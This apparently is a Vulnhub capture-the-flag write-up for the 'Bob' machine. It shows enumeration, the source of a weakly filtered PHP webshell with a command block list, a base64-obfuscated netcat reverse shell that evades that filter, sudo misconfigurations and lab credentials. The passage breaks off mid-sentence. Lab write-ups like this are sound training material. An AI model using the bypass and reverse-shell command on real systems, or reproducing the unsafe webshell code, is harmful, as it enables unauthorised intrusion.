---
title: Bob
Category: Vulnhub
---

## Enumeration

Starting enumeration, ran nmap with default scripts and service detection and found a HTML site running on TCP/80.

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 15:08 -03                                                                                                                             
Nmap scan report for Milburg-High.mshome.net (172.17.11.83)
Host is up (0.00027s latency).                                                                
Not shown: 998 closed ports                                                                                                                                                                 
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b                                                           
80/tcp open  http    Apache httpd 2.4.25 ((Debian))                                                                                                                                         
| http-robots.txt: 4 disallowed entries                                                       
| /login.php /dev_shell.php /lat_memo.html                                                                                                                                                  
|_/passwords.html                      
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Unix   
```

This site has 4 interesting entries, that were verified

- `login.php`, which doesn't exist anymore

- `lat_memo.html`, which contains the following message from BOB:
  > Memo sent at GMT+10:00 2:37:42 by User: Bob
  > Hey guys IT here don't forget to check your emails regarding the recent security breach. There is a web shell running on the server with no protection but it should be safe as I have ported over the filter from the old windows server to our new linux one. Your email will have the link to the shell.
  > -Bob

- `passwords.html`, which had the content below:

  > Really who made this file at least get a hash of your password to display, hackers can't do anything with a hash, this is probably why we had a security breach in the first place. Comeon people this is basic 101 security! I have moved the file off the server. Don't make me have to clean up the mess everytime someone does something as stupid as this. We will have a meeting about this and other stuff I found on the server. >:(
  > -Bob

- dev_shell.php, is a webshell

  - Simple commands like ls works properly, but some of then fail displaying some messages.

  - Leveraging the possibilities, used cat to display the content of the php page itself to understand its limitations (cat dev_shell.php)

```html
<html>
<body>
   <?php
//init
$invalid = 0;
$command = ($_POST['in_command']);
$bad_words = array("pwd","ls","netcat","ssh","wget","ping","traceroute","cat","nc");
?>
   <style>
   
   </style>
   <!-- WIP, don't forget to report any bugs we don't want another breach guys
  -Bob -->
   <div id="shell">
      <h2>
         dev_shell
      </h2>
      <form action="dev_shell.php" method="post">
         Command: <input type="text" name="in_command" /> <br>
         <input type="submit" value="submit">
      </form>
      <br>
      <h5>Output:</h5>

      <?php
system("running command...");
//executes system Command
//checks for sneaky ;
if (strpos($command, ';') !== false)
{
    system("echo Nice try skid, but you will never get through this bulletproof php code"); //doesn't work :P
}
else
{
    $is_he_a_bad_man = explode(' ', trim($command));
    //checks for dangerous commands
    if (in_array($is_he_a_bad_man[0], $bad_words))
    {
        system("echo Get out skid lol");
    }
    else
    {
        system($_POST['in_command']);
    }
}
?>

   </div>
   <img src="dev_shell_back.png" id="back" alt="">
</body>
</html>
```

- The content shows, php code prevents execute of content containing:
- ";" which can allow multiple executions
- Contains one of the "badwords"
- "pwd","ls","netcat","ssh","wget","ping","traceroute","cat","nc"
- Based on that, crafted the command, using base64 to decode  and run content, using this command was possible to get the reverse shell

```bash
echo -n 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMudHJhZGl0aW9uYWwgMTcyLjE3LjkuMTMxIDQ0NDMgPi90bXAvZg==' | base64 -d | bash
```

- After upgrading shell to get autocomplete by spawning a tty using python, started the enumeration. Found hidden file .hint containing the content below

```plaintext
www-data@Milburg-High:/var/www/html$ cat .hint 
Have you tried spawning a tty shell?
Also don't forget to check for hidden files ;)
```

- Executing LinEnum, noticed the following interesting stuff to privesc

```plaintext
User www-data may run the following commands on Milburg-High:
      (ALL) NOPASSWD: /usr/bin/service apache2 *
      (root) NOPASSWD: /bin/systemctl start ssh
```

- As Bob mentioned that he moved the old passwords.html file, used the following command to see if www-data would be able to read it from somewhere. Started from /home directory and we were lucky, getting two credentials

```bash
$ cat /home/bob/.old_passwordfile.html
<html>
   <p>
   jc:Qwerty
   seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
   </p>
</html>
```

- From remote shell, was able to
